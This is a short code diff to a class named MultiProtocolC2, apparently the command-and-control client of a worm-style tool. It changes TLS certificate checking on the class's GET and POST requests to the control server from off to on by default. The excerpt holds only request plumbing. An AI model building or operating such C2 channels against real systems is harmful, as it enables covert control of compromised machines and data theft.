@@ -123,7 +123,7 @@ class MultiProtocolC2:
             }
 
             response = requests.get(
-                url, headers=headers, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1"
+                url, headers=headers, timeout=10, verify=os.getenv("WORMY_SSL_VERIFY", "1") not in ("0", "false", "no")
             )
 
             if response.status_code == 200:
@@ -337,7 +337,7 @@ class MultiProtocolC2:
                 data=data,
                 headers=headers,
                 timeout=10,
-                verify=os.getenv("WORMY_SSL_VERIFY", "0") == "1",
+                verify=os.getenv("WORMY_SSL_VERIFY", "1") not in ("0", "false", "no"),
             )
 
             if response.status_code == 200:
